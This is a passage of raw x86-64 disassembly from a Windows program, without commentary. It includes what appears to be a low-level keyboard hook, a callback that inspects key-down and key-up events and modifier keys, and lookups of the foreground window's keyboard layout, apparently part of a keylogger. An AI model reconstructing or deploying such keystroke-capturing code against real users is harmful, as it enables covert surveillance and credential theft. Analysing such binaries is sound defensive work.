  4026ca:	ba 80 00 00 00       	mov    $0x80,%edx
  4026cf:	48 89 d9             	mov    %rbx,%rcx
  4026d2:	ff 10                	call   *(%rax)
  4026d4:	85 c0                	test   %eax,%eax
  4026d6:	0f 95 c2             	setne  %dl
  4026d9:	84 d2                	test   %dl,%dl
  4026db:	75 11                	jne    0x4026ee
  4026dd:	ba 01 00 00 00       	mov    $0x1,%edx
  4026e2:	48 89 f9             	mov    %rdi,%rcx
  4026e5:	48 83 c4 20          	add    $0x20,%rsp
  4026e9:	5b                   	pop    %rbx
  4026ea:	5e                   	pop    %rsi
  4026eb:	5f                   	pop    %rdi
  4026ec:	eb 83                	jmp    0x402671
  4026ee:	48 89 d9             	mov    %rbx,%rcx
  4026f1:	ff 16                	call   *(%rsi)
  4026f3:	85 c0                	test   %eax,%eax
  4026f5:	74 e6                	je     0x4026dd
  4026f7:	48 83 c4 20          	add    $0x20,%rsp
  4026fb:	5b                   	pop    %rbx
  4026fc:	5e                   	pop    %rsi
  4026fd:	5f                   	pop    %rdi
  4026fe:	c3                   	ret
  4026ff:	56                   	push   %rsi
  402700:	53                   	push   %rbx
  402701:	48 83 ec 28          	sub    $0x28,%rsp
  402705:	48 89 ce             	mov    %rcx,%rsi
  402708:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  40270c:	0f b6 da             	movzbl %dl,%ebx
  40270f:	89 da                	mov    %ebx,%edx
  402711:	e8 21 16 00 00       	call   0x403d37
  402716:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
  40271a:	89 da                	mov    %ebx,%edx
  40271c:	e8 16 16 00 00       	call   0x403d37
  402721:	48 8b 4e 40          	mov    0x40(%rsi),%rcx
  402725:	89 da                	mov    %ebx,%edx
  402727:	48 83 c4 28          	add    $0x28,%rsp
  40272b:	5b                   	pop    %rbx
  40272c:	5e                   	pop    %rsi
  40272d:	e9 05 16 00 00       	jmp    0x403d37
  402732:	56                   	push   %rsi
  402733:	53                   	push   %rbx
  402734:	48 83 ec 28          	sub    $0x28,%rsp
  402738:	48 89 ce             	mov    %rcx,%rsi
  40273b:	48 8b 49 10          	mov    0x10(%rcx),%rcx
  40273f:	0f b6 da             	movzbl %dl,%ebx
  402742:	89 da                	mov    %ebx,%edx
  402744:	e8 ee 15 00 00       	call   0x403d37
  402749:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
  40274d:	89 da                	mov    %ebx,%edx
  40274f:	e8 e3 15 00 00       	call   0x403d37
  402754:	48 8b 4e 28          	mov    0x28(%rsi),%rcx
  402758:	89 da                	mov    %ebx,%edx
  40275a:	e8 d8 15 00 00       	call   0x403d37
  40275f:	48 8b 4e 30          	mov    0x30(%rsi),%rcx
  402763:	89 da                	mov    %ebx,%edx
  402765:	48 83 c4 28          	add    $0x28,%rsp
  402769:	5b                   	pop    %rbx
  40276a:	5e                   	pop    %rsi
  40276b:	e9 c7 15 00 00       	jmp    0x403d37
  402770:	56                   	push   %rsi
  402771:	53                   	push   %rbx
  402772:	48 83 ec 28          	sub    $0x28,%rsp
  402776:	48 89 ce             	mov    %rcx,%rsi
  402779:	48 8b 49 08          	mov    0x8(%rcx),%rcx
  40277d:	0f b6 da             	movzbl %dl,%ebx
  402780:	89 da                	mov    %ebx,%edx
  402782:	e8 b0 15 00 00       	call   0x403d37
  402787:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
  40278b:	89 da                	mov    %ebx,%edx
  40278d:	48 83 c4 28          	add    $0x28,%rsp
  402791:	5b                   	pop    %rbx
  402792:	5e                   	pop    %rsi
  402793:	e9 9f 15 00 00       	jmp    0x403d37
  402798:	57                   	push   %rdi
  402799:	56                   	push   %rsi
  40279a:	53                   	push   %rbx
  40279b:	48 83 ec 20          	sub    $0x20,%rsp
  40279f:	31 db                	xor    %ebx,%ebx
  4027a1:	48 89 ce             	mov    %rcx,%rsi
  4027a4:	0f b6 fa             	movzbl %dl,%edi
  4027a7:	48 85 f6             	test   %rsi,%rsi
  4027aa:	74 1d                	je     0x4027c9
  4027ac:	48 3b 1e             	cmp    (%rsi),%rbx
  4027af:	7d 18                	jge    0x4027c9
  4027b1:	48 89 d8             	mov    %rbx,%rax
  4027b4:	89 fa                	mov    %edi,%edx
  4027b6:	48 ff c3             	inc    %rbx
  4027b9:	48 c1 e0 04          	shl    $0x4,%rax
  4027bd:	48 8b 4c 06 18       	mov    0x18(%rsi,%rax,1),%rcx
  4027c2:	e8 70 15 00 00       	call   0x403d37
  4027c7:	eb de                	jmp    0x4027a7
  4027c9:	48 83 c4 20          	add    $0x20,%rsp
  4027cd:	5b                   	pop    %rbx
  4027ce:	5e                   	pop    %rsi
  4027cf:	5f                   	pop    %rdi
  4027d0:	c3                   	ret
  4027d1:	41 56                	push   %r14
  4027d3:	41 55                	push   %r13
  4027d5:	41 54                	push   %r12
  4027d7:	55                   	push   %rbp
  4027d8:	57                   	push   %rdi
  4027d9:	56                   	push   %rsi
  4027da:	53                   	push   %rbx
  4027db:	48 83 ec 40          	sub    $0x40,%rsp
  4027df:	85 c9                	test   %ecx,%ecx
  4027e1:	89 cf                	mov    %ecx,%edi
  4027e3:	48 89 d6             	mov    %rdx,%rsi
  4027e6:	4c 89 c5             	mov    %r8,%rbp
  4027e9:	0f 85 db 01 00 00    	jne    0x4029ca
  4027ef:	4d 63 28             	movslq (%r8),%r13
  4027f2:	4c 8d 0d 07 eb 00 00 	lea    0xeb07(%rip),%r9        # 0x411300
  4027f9:	b9 a1 b0 b9 12       	mov    $0x12b9b0a1,%ecx
  4027fe:	4d 85 ed             	test   %r13,%r13
  402801:	4c 89 eb             	mov    %r13,%rbx
  402804:	49 0f 45 cd          	cmovne %r13,%rcx
  402808:	48 89 ca             	mov    %rcx,%rdx
  40280b:	81 e2 ff 01 00 00    	and    $0x1ff,%edx
  402811:	48 6b c2 18          	imul   $0x18,%rdx,%rax
  402815:	4c 01 c8             	add    %r9,%rax
  402818:	4c 8b 40 10          	mov    0x10(%rax),%r8
  40281c:	4d 85 c0             	test   %r8,%r8
  40281f:	74 1a                	je     0x40283b
  402821:	49 39 c8             	cmp    %rcx,%r8
  402824:	75 0a                	jne    0x402830
  402826:	4c 3b 68 18          	cmp    0x18(%rax),%r13
  40282a:	0f 84 8c 01 00 00    	je     0x4029bc
  402830:	48 ff c2             	inc    %rdx
  402833:	81 e2 ff 01 00 00    	and    $0x1ff,%edx
  402839:	eb d6                	jmp    0x402811
  40283b:	48 8b 0d 4e 4d 01 00 	mov    0x14d4e(%rip),%rcx        # 0x417590
  402842:	ba 30 00 00 00       	mov    $0x30,%edx
  402847:	e8 f6 29 00 00       	call   0x405242
  40284c:	4c 89 e9             	mov    %r13,%rcx
  40284f:	49 89 c4             	mov    %rax,%r12
  402852:	48 8b 05 87 4e 01 00 	mov    0x14e87(%rip),%rax        # 0x4176e0
  402859:	49 89 04 24          	mov    %rax,(%r12)
  40285d:	48 8d 05 2a d1 00 00 	lea    0xd12a(%rip),%rax        # 0x40f98e
  402864:	49 89 44 24 10       	mov    %rax,0x10(%r12)
  402869:	e8 83 2e 00 00       	call   0x4056f1
  40286e:	b9 0f 00 00 00       	mov    $0xf,%ecx
  402873:	48 85 c0             	test   %rax,%rax
  402876:	49 89 c5             	mov    %rax,%r13
  402879:	74 08                	je     0x402883
  40287b:	49 8b 45 00          	mov    0x0(%r13),%rax
  40287f:	48 8d 48 0f          	lea    0xf(%rax),%rcx
  402883:	e8 f8 29 00 00       	call   0x405280
  402888:	48 8d 15 91 1a 01 00 	lea    0x11a91(%rip),%rdx        # 0x414320
  40288f:	49 89 c6             	mov    %rax,%r14
  402892:	48 89 c1             	mov    %rax,%rcx
  402895:	e8 8d 37 00 00       	call   0x406027
  40289a:	4c 89 ea             	mov    %r13,%rdx
  40289d:	4c 89 f1             	mov    %r14,%rcx
  4028a0:	e8 82 37 00 00       	call   0x406027
  4028a5:	49 8d 4c 24 18       	lea    0x18(%r12),%rcx
  4028aa:	4c 89 f2             	mov    %r14,%rdx
  4028ad:	e8 aa 18 00 00       	call   0x40415c
  4028b2:	49 8d 4c 24 08       	lea    0x8(%r12),%rcx
  4028b7:	31 d2                	xor    %edx,%edx
  4028b9:	e8 9e 18 00 00       	call   0x40415c
  4028be:	4c 8d 0d bb d0 00 00 	lea    0xd0bb(%rip),%r9        # 0x40f980
  4028c5:	4c 89 e1             	mov    %r12,%rcx
  4028c8:	48 c7 44 24 20 06 01 	movq   $0x106,0x20(%rsp)
  4028cf:	00 00 
  4028d1:	4c 8d 05 b3 d0 00 00 	lea    0xd0b3(%rip),%r8        # 0x40f98b
  4028d8:	48 8d 15 af d0 00 00 	lea    0xd0af(%rip),%rdx        # 0x40f98e
  4028df:	e8 d1 32 00 00       	call   0x405bb5
  4028e4:	31 c0                	xor    %eax,%eax
  4028e6:	48 81 fe 00 01 00 00 	cmp    $0x100,%rsi
  4028ed:	74 09                	je     0x4028f8
  4028ef:	48 81 fe 04 01 00 00 	cmp    $0x104,%rsi
  4028f6:	75 0f                	jne    0x402907
  4028f8:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  4028fd:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  402902:	e9 a1 00 00 00       	jmp    0x4029a8
  402907:	48 81 fe 01 01 00 00 	cmp    $0x101,%rsi
  40290e:	74 0d                	je     0x40291d
  402910:	48 81 fe 05 01 00 00 	cmp    $0x105,%rsi
  402917:	0f 85 ad 00 00 00    	jne    0x4029ca
  40291d:	83 fb 11             	cmp    $0x11,%ebx
  402920:	74 35                	je     0x402957
  402922:	81 fb a2 00 00 00    	cmp    $0xa2,%ebx
  402928:	74 2d                	je     0x402957
  40292a:	89 da                	mov    %ebx,%edx
  40292c:	83 e2 fd             	and    $0xfffffffd,%edx
  40292f:	83 fa 10             	cmp    $0x10,%edx
  402932:	74 23                	je     0x402957
  402934:	83 fb 14             	cmp    $0x14,%ebx
  402937:	74 1e                	je     0x402957
  402939:	8d 93 70 ff ff ff    	lea    -0x90(%rbx),%edx
  40293f:	83 fa 15             	cmp    $0x15,%edx
  402942:	77 0b                	ja     0x40294f
  402944:	b9 01 00 3b 00       	mov    $0x3b0001,%ecx
  402949:	48 0f a3 d1          	bt     %rdx,%rcx
  40294d:	72 08                	jb     0x402957
  40294f:	83 eb 5b             	sub    $0x5b,%ebx
  402952:	83 fb 01             	cmp    $0x1,%ebx
  402955:	77 73                	ja     0x4029ca
  402957:	48 89 c1             	mov    %rax,%rcx
  40295a:	31 db                	xor    %ebx,%ebx
  40295c:	e8 7c 62 00 00       	call   0x408bdd
  402961:	48 85 c0             	test   %rax,%rax
  402964:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  402969:	74 03                	je     0x40296e
  40296b:	48 8b 18             	mov    (%rax),%rbx
  40296e:	48 8d 53 01          	lea    0x1(%rbx),%rdx
  402972:	48 89 c1             	mov    %rax,%rcx
  402975:	e8 4f 29 00 00       	call   0x4052c9
  40297a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
  40297f:	48 89 c2             	mov    %rax,%rdx
  402982:	e8 f2 29 00 00       	call   0x405379
  402987:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
  40298c:	48 8d 43 ff          	lea    -0x1(%rbx),%rax
  402990:	48 85 c0             	test   %rax,%rax
  402993:	7f 1a                	jg     0x4029af
  402995:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
  40299a:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
  40299f:	c6 40 11 2f          	movb   $0x2f,0x11(%rax)
  4029a3:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
  4029a8:	e8 ad 49 00 00       	call   0x40735a
  4029ad:	eb 1b                	jmp    0x4029ca
  4029af:	8a 4c 02 10          	mov    0x10(%rdx,%rax,1),%cl
  4029b3:	88 4c 02 11          	mov    %cl,0x11(%rdx,%rax,1)
  4029b7:	48 ff c8             	dec    %rax
  4029ba:	eb d4                	jmp    0x402990
  4029bc:	48 8b 48 20          	mov    0x20(%rax),%rcx
  4029c0:	e8 18 62 00 00       	call   0x408bdd
  4029c5:	e9 1c ff ff ff       	jmp    0x4028e6
  4029ca:	48 8b 05 1f 49 01 00 	mov    0x1491f(%rip),%rax        # 0x4172f0
  4029d1:	49 89 e9             	mov    %rbp,%r9
  4029d4:	49 89 f0             	mov    %rsi,%r8
  4029d7:	89 fa                	mov    %edi,%edx
  4029d9:	31 c9                	xor    %ecx,%ecx
  4029db:	ff 10                	call   *(%rax)
  4029dd:	48 83 c4 40          	add    $0x40,%rsp
  4029e1:	5b                   	pop    %rbx
  4029e2:	5e                   	pop    %rsi
  4029e3:	5f                   	pop    %rdi
  4029e4:	5d                   	pop    %rbp
  4029e5:	41 5c                	pop    %r12
  4029e7:	41 5d                	pop    %r13
  4029e9:	41 5e                	pop    %r14
  4029eb:	c3                   	ret
  4029ec:	48 85 c9             	test   %rcx,%rcx
  4029ef:	74 0b                	je     0x4029fc
  4029f1:	48 83 39 00          	cmpq   $0x0,(%rcx)
  4029f5:	74 05                	je     0x4029fc
  4029f7:	48 8d 41 10          	lea    0x10(%rcx),%rax
  4029fb:	c3                   	ret
  4029fc:	48 8d 05 94 cf 00 00 	lea    0xcf94(%rip),%rax        # 0x40f997
  402a03:	c3                   	ret
  402a04:	48 85 c9             	test   %rcx,%rcx
  402a07:	74 08                	je     0x402a11
  402a09:	48 83 39 00          	cmpq   $0x0,(%rcx)
  402a0d:	74 02                	je     0x402a11
  402a0f:	eb db                	jmp    0x4029ec
  402a11:	48 8d 05 80 cf 00 00 	lea    0xcf80(%rip),%rax        # 0x40f998
  402a18:	c3                   	ret
  402a19:	41 54                	push   %r12
  402a1b:	55                   	push   %rbp
  402a1c:	57                   	push   %rdi
  402a1d:	56                   	push   %rsi
  402a1e:	53                   	push   %rbx
  402a1f:	48 83 ec 30          	sub    $0x30,%rsp
  402a23:	31 ff                	xor    %edi,%edi
  402a25:	e8 da ff ff ff       	call   0x402a04
  402a2a:	48 85 c9             	test   %rcx,%rcx
  402a2d:	48 89 c6             	mov    %rax,%rsi
  402a30:	74 03                	je     0x402a35
  402a32:	48 8b 39             	mov    (%rcx),%rdi
  402a35:	31 db                	xor    %ebx,%ebx
  402a37:	48 85 f6             	test   %rsi,%rsi
  402a3a:	74 5e                	je     0x402a9a
  402a3c:	48 8b 2d ed 48 01 00 	mov    0x148ed(%rip),%rbp        # 0x417330
  402a43:	41 89 f9             	mov    %edi,%r9d
  402a46:	49 89 f0             	mov    %rsi,%r8
  402a49:	31 d2                	xor    %edx,%edx
  402a4b:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  402a50:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  402a57:	00 
  402a58:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
  402a5f:	00 00 
  402a61:	ff 55 00             	call   *0x0(%rbp)
  402a64:	48 63 c8             	movslq %eax,%rcx
  402a67:	49 89 cc             	mov    %rcx,%r12
  402a6a:	48 ff c1             	inc    %rcx
  402a6d:	48 01 c9             	add    %rcx,%rcx
  402a70:	e8 3e 28 00 00       	call   0x4052b3
  402a75:	48 89 c1             	mov    %rax,%rcx
  402a78:	48 89 c3             	mov    %rax,%rbx
  402a7b:	e8 84 ff ff ff       	call   0x402a04
  402a80:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
  402a85:	41 89 f9             	mov    %edi,%r9d
  402a88:	49 89 f0             	mov    %rsi,%r8
  402a8b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  402a90:	31 d2                	xor    %edx,%edx
  402a92:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  402a97:	ff 55 00             	call   *0x0(%rbp)
  402a9a:	48 89 d8             	mov    %rbx,%rax
  402a9d:	48 83 c4 30          	add    $0x30,%rsp
  402aa1:	5b                   	pop    %rbx
  402aa2:	5e                   	pop    %rsi
  402aa3:	5f                   	pop    %rdi
  402aa4:	5d                   	pop    %rbp
  402aa5:	41 5c                	pop    %r12
  402aa7:	c3                   	ret
  402aa8:	48 83 ec 28          	sub    $0x28,%rsp
  402aac:	e8 68 ff ff ff       	call   0x402a19
  402ab1:	48 89 c1             	mov    %rax,%rcx
  402ab4:	48 83 c4 28          	add    $0x28,%rsp
  402ab8:	e9 47 ff ff ff       	jmp    0x402a04
  402abd:	48 83 ec 68          	sub    $0x68,%rsp
  402ac1:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  402ac7:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
  402acc:	48 c7 02 00 00 00 00 	movq   $0x0,(%rdx)
  402ad3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  402ad8:	48 8b 05 01 47 01 00 	mov    0x14701(%rip),%rax        # 0x4171e0
  402adf:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
  402ae4:	ba 06 00 00 c8       	mov    $0xc8000006,%edx
  402ae9:	c7 44 24 5c 00 00 00 	movl   $0x0,0x5c(%rsp)
  402af0:	00 
  402af1:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
  402af8:	00 00 
  402afa:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  402b01:	00 00 
  402b03:	c7 44 24 28 08 00 00 	movl   $0x8,0x28(%rsp)
  402b0a:	00 
  402b0b:	ff 10                	call   *(%rax)
  402b0d:	85 c0                	test   %eax,%eax
  402b0f:	0f 94 c0             	sete   %al
  402b12:	48 83 c4 68          	add    $0x68,%rsp
  402b16:	c3                   	ret
  402b17:	56                   	push   %rsi
  402b18:	53                   	push   %rbx
  402b19:	48 83 ec 38          	sub    $0x38,%rsp
  402b1d:	48 8b 05 8c 4e 01 00 	mov    0x14e8c(%rip),%rax        # 0x4179b0
  402b24:	8b 30                	mov    (%rax),%esi
  402b26:	ff 15 08 88 03 00    	call   *0x38808(%rip)        # 0x43b334
  402b2c:	89 c3                	mov    %eax,%ebx
  402b2e:	89 f1                	mov    %esi,%ecx
  402b30:	ff 15 96 88 03 00    	call   *0x38896(%rip)        # 0x43b3cc
  402b36:	89 d9                	mov    %ebx,%ecx
  402b38:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  402b3d:	ff 15 61 88 03 00    	call   *0x38861(%rip)        # 0x43b3a4
  402b43:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  402b48:	48 83 c4 38          	add    $0x38,%rsp
  402b4c:	5b                   	pop    %rbx
  402b4d:	5e                   	pop    %rsi
  402b4e:	c3                   	ret
  402b4f:	48 83 ec 28          	sub    $0x28,%rsp
  402b53:	e8 bf ff ff ff       	call   0x402b17
  402b58:	31 d2                	xor    %edx,%edx
  402b5a:	48 8b 88 80 34 00 00 	mov    0x3480(%rax),%rcx
  402b61:	48 83 c4 28          	add    $0x28,%rsp
  402b65:	e9 cd 11 00 00       	jmp    0x403d37
  402b6a:	48 83 ec 28          	sub    $0x28,%rsp
  402b6e:	e8 a4 ff ff ff       	call   0x402b17
  402b73:	31 d2                	xor    %edx,%edx
  402b75:	48 8b 88 78 34 00 00 	mov    0x3478(%rax),%rcx
  402b7c:	48 83 c4 28          	add    $0x28,%rsp
  402b80:	e9 b2 11 00 00       	jmp    0x403d37
  402b85:	48 83 ec 28          	sub    $0x28,%rsp
  402b89:	e8 94 fa ff ff       	call   0x402622
  402b8e:	48 89 c1             	mov    %rax,%rcx
  402b91:	48 8b 05 a8 45 01 00 	mov    0x145a8(%rip),%rax        # 0x417140
  402b98:	ff 10                	call   *(%rax)
  402b9a:	89 c2                	mov    %eax,%edx
  402b9c:	31 c0                	xor    %eax,%eax
  402b9e:	83 fa ff             	cmp    $0xffffffff,%edx
  402ba1:	74 0b                	je     0x402bae
  402ba3:	89 d0                	mov    %edx,%eax
  402ba5:	c1 e8 04             	shr    $0x4,%eax
  402ba8:	83 f0 01             	xor    $0x1,%eax
  402bab:	83 e0 01             	and    $0x1,%eax
  402bae:	48 83 c4 28          	add    $0x28,%rsp
  402bb2:	c3                   	ret
  402bb3:	48 83 ec 38          	sub    $0x38,%rsp
  402bb7:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  402bbc:	e8 61 fa ff ff       	call   0x402622
  402bc1:	48 8b 0d 48 45 01 00 	mov    0x14548(%rip),%rcx        # 0x417110
  402bc8:	48 8b 54 24 28       	mov    0x28(%rsp),%rdx
  402bcd:	4c 8b 01             	mov    (%rcx),%r8
  402bd0:	48 89 c1             	mov    %rax,%rcx
  402bd3:	48 83 c4 38          	add    $0x38,%rsp
  402bd7:	49 ff e0             	rex.WB jmp *%r8
  402bda:	53                   	push   %rbx
  402bdb:	48 83 ec 50          	sub    $0x50,%rsp
  402bdf:	48 8b 05 2a 47 01 00 	mov    0x1472a(%rip),%rax        # 0x417310
  402be6:	45 31 c9             	xor    %r9d,%r9d
  402be9:	45 31 c0             	xor    %r8d,%r8d
  402bec:	48 8d 15 de fb ff ff 	lea    -0x422(%rip),%rdx        # 0x4027d1
  402bf3:	b9 0d 00 00 00       	mov    $0xd,%ecx
  402bf8:	ff 10                	call   *(%rax)
  402bfa:	ba 30 00 00 00       	mov    $0x30,%edx
  402bff:	48 8d 5c 24 20       	lea    0x20(%rsp),%rbx
  402c04:	48 89 d9             	mov    %rbx,%rcx
  402c07:	e8 40 15 00 00       	call   0x40414c
  402c0c:	48 8b 05 ed 46 01 00 	mov    0x146ed(%rip),%rax        # 0x417300
  402c13:	45 31 c9             	xor    %r9d,%r9d
  402c16:	45 31 c0             	xor    %r8d,%r8d
  402c19:	31 d2                	xor    %edx,%edx
  402c1b:	48 89 d9             	mov    %rbx,%rcx
  402c1e:	ff 10                	call   *(%rax)
  402c20:	85 c0                	test   %eax,%eax
  402c22:	75 e8                	jne    0x402c0c
  402c24:	48 83 c4 50          	add    $0x50,%rsp
  402c28:	5b                   	pop    %rbx
  402c29:	c3                   	ret
  402c2a:	57                   	push   %rdi
  402c2b:	56                   	push   %rsi
  402c2c:	53                   	push   %rbx
  402c2d:	48 83 ec 30          	sub    $0x30,%rsp
  402c31:	48 85 c9             	test   %rcx,%rcx
  402c34:	48 89 cb             	mov    %rcx,%rbx
  402c37:	0f 84 bb 00 00 00    	je     0x402cf8
  402c3d:	48 83 39 00          	cmpq   $0x0,(%rcx)
  402c41:	74 53                	je     0x402c96
  402c43:	48 8b 01             	mov    (%rcx),%rax
  402c46:	8a 44 01 0f          	mov    0xf(%rcx,%rax,1),%al
  402c4a:	3c 5c                	cmp    $0x5c,%al
  402c4c:	74 48                	je     0x402c96
  402c4e:	3c 2f                	cmp    $0x2f,%al
  402c50:	74 44                	je     0x402c96
  402c52:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
  402c57:	ba 10 00 00 00       	mov    $0x10,%edx
  402c5c:	48 89 f1             	mov    %rsi,%rcx
  402c5f:	e8 e8 14 00 00       	call   0x40414c
  402c64:	31 d2                	xor    %edx,%edx
  402c66:	48 89 f1             	mov    %rsi,%rcx
  402c69:	e8 0b 27 00 00       	call   0x405379
  402c6e:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
  402c72:	31 d2                	xor    %edx,%edx
  402c74:	e8 00 27 00 00       	call   0x405379
  402c79:	48 8b 03             	mov    (%rbx),%rax
  402c7c:	48 8d 78 ff          	lea    -0x1(%rax),%rdi
  402c80:	48 85 ff             	test   %rdi,%rdi
  402c83:	78 48                	js     0x402ccd
  402c85:	8a 44 3b 10          	mov    0x10(%rbx,%rdi,1),%al
  402c89:	3c 5c                	cmp    $0x5c,%al
  402c8b:	74 0d                	je     0x402c9a
  402c8d:	3c 2f                	cmp    $0x2f,%al
  402c8f:	74 09                	je     0x402c9a
  402c91:	48 ff cf             	dec    %rdi
  402c94:	eb ea                	jmp    0x402c80
  402c96:	31 db                	xor    %ebx,%ebx
  402c98:	eb 5e                	jmp    0x402cf8
  402c9a:	48 85 ff             	test   %rdi,%rdi
  402c9d:	b8 00 00 00 00       	mov    $0x0,%eax
  402ca2:	48 89 d9             	mov    %rbx,%rcx
  402ca5:	4c 8d 47 ff          	lea    -0x1(%rdi),%r8
  402ca9:	4c 0f 44 c0          	cmove  %rax,%r8
  402cad:	31 d2                	xor    %edx,%edx
  402caf:	e8 af 5e 00 00       	call   0x408b63
  402cb4:	48 89 f1             	mov    %rsi,%rcx
  402cb7:	48 89 c2             	mov    %rax,%rdx
  402cba:	e8 ba 26 00 00       	call   0x405379
  402cbf:	48 8d 57 01          	lea    0x1(%rdi),%rdx
  402cc3:	48 89 d9             	mov    %rbx,%rcx
  402cc6:	e8 01 5f 00 00       	call   0x408bcc
  402ccb:	eb 12                	jmp    0x402cdf
  402ccd:	48 89 f1             	mov    %rsi,%rcx
  402cd0:	31 d2                	xor    %edx,%edx
  402cd2:	e8 a2 26 00 00       	call   0x405379
  402cd7:	48 89 d9             	mov    %rbx,%rcx
  402cda:	e8 fe 5e 00 00       	call   0x408bdd
  402cdf:	48 8d 4e 08          	lea    0x8(%rsi),%rcx
  402ce3:	48 89 c2             	mov    %rax,%rdx
  402ce6:	e8 8e 26 00 00       	call   0x405379
  402ceb:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  402cf0:	e8 e8 5e 00 00       	call   0x408bdd
  402cf5:	48 89 c3             	mov    %rax,%rbx
  402cf8:	48 89 d8             	mov    %rbx,%rax
  402cfb:	48 83 c4 30          	add    $0x30,%rsp
  402cff:	5b                   	pop    %rbx
  402d00:	5e                   	pop    %rsi
  402d01:	5f                   	pop    %rdi
  402d02:	c3                   	ret
  402d03:	55                   	push   %rbp
  402d04:	41 57                	push   %r15
  402d06:	41 56                	push   %r14
  402d08:	41 55                	push   %r13
  402d0a:	41 54                	push   %r12
  402d0c:	57                   	push   %rdi
  402d0d:	56                   	push   %rsi
  402d0e:	53                   	push   %rbx
  402d0f:	48 89 e5             	mov    %rsp,%rbp
  402d12:	48 81 ec 08 07 00 00 	sub    $0x708,%rsp
  402d19:	44 8a 01             	mov    (%rcx),%r8b
  402d1c:	48 8b 51 08          	mov    0x8(%rcx),%rdx
  402d20:	48 89 c8             	mov    %rcx,%rax
  402d23:	41 80 f8 01          	cmp    $0x1,%r8b
  402d27:	48 8b 49 10          	mov    0x10(%rcx),%rcx
  402d2b:	48 c7 85 28 f9 ff ff 	movq   $0x0,-0x6d8(%rbp)
  402d32:	00 00 00 00 
  402d36:	48 c7 85 30 f9 ff ff 	movq   $0x0,-0x6d0(%rbp)
  402d3d:	00 00 00 00 
  402d41:	48 8b 40 18          	mov    0x18(%rax),%rax
  402d45:	76 0f                	jbe    0x402d56
  402d47:	41 80 f8 02          	cmp    $0x2,%r8b
  402d4b:	0f 84 df 02 00 00    	je     0x403030
  402d51:	e9 f6 04 00 00       	jmp    0x40324c
  402d56:	74 12                	je     0x402d6a
  402d58:	48 89 c1             	mov    %rax,%rcx
  402d5b:	e8 df 50 00 00       	call   0x407e3f
  402d60:	48 8d 15 f9 16 01 00 	lea    0x116f9(%rip),%rdx        # 0x414460
  402d67:	48 89 c1             	mov    %rax,%rcx
  402d6a:	e8 d0 50 00 00       	call   0x407e3f
  402d6f:	31 f6                	xor    %esi,%esi
  402d71:	48 89 85 28 f9 ff ff 	mov    %rax,-0x6d8(%rbp)
  402d78:	48 8b 8d 28 f9 ff ff 	mov    -0x6d8(%rbp),%rcx
  402d7f:	e8 81 4b 00 00       	call   0x407905
  402d84:	84 c0                	test   %al,%al
  402d86:	0f 84 c2 04 00 00    	je     0x40324e
  402d8c:	48 8b 0d 3d 49 01 00 	mov    0x1493d(%rip),%rcx        # 0x4176d0
  402d93:	ba 01 00 00 00       	mov    $0x1,%edx
  402d98:	e8 59 30 00 00       	call   0x405df6
  402d9d:	48 8d 0d 9c 16 01 00 	lea    0x1169c(%rip),%rcx        # 0x414440
  402da4:	48 8b 70 10          	mov    0x10(%rax),%rsi
  402da8:	48 c7 00 01 00 00 00 	movq   $0x1,(%rax)
  402daf:	48 89 c3             	mov    %rax,%rbx
  402db2:	e8 e3 23 00 00       	call   0x40519a
  402db7:	48 89 43 10          	mov    %rax,0x10(%rbx)
  402dbb:	48 85 f6             	test   %rsi,%rsi
  402dbe:	75 46                	jne    0x402e06
  402dc0:	48 8b 15 09 49 01 00 	mov    0x14909(%rip),%rdx        # 0x4176d0
  402dc7:	48 89 d9             	mov    %rbx,%rcx
  402dca:	e8 56 30 00 00       	call   0x405e25
  402dcf:	48 8d 0d 2a 16 01 00 	lea    0x1162a(%rip),%rcx        # 0x414400
  402dd6:	48 89 85 30 f9 ff ff 	mov    %rax,-0x6d0(%rbp)
  402ddd:	48 8b 00             	mov    (%rax),%rax
  402de0:	48 8b bd 30 f9 ff ff 	mov    -0x6d0(%rbp),%rdi
  402de7:	48 8d 50 01          	lea    0x1(%rax),%rdx
  402deb:	48 8d 34 c7          	lea    (%rdi,%rax,8),%rsi
  402def:	48 89 17             	mov    %rdx,(%rdi)
  402df2:	48 8b 5e 10          	mov    0x10(%rsi),%rbx
  402df6:	e8 9f 23 00 00       	call   0x40519a
  402dfb:	48 89 46 10          	mov    %rax,0x10(%rsi)
  402dff:	48 85 db             	test   %rbx,%rbx
  402e02:	75 0c                	jne    0x402e10
  402e04:	eb 12                	jmp    0x402e18
  402e06:	48 89 f1             	mov    %rsi,%rcx
  402e09:	e8 f2 ae 00 00       	call   0x40dd00
  402e0e:	eb b0                	jmp    0x402dc0
  402e10:	48 89 d9             	mov    %rbx,%rcx
  402e13:	e8 e8 ae 00 00       	call   0x40dd00
  402e18:	48 8d 9d 58 fb ff ff 	lea    -0x4a8(%rbp),%rbx
  402e1f:	ba 50 02 00 00       	mov    $0x250,%edx
  402e24:	48 89 d9             	mov    %rbx,%rcx
  402e27:	e8 20 13 00 00       	call   0x40414c
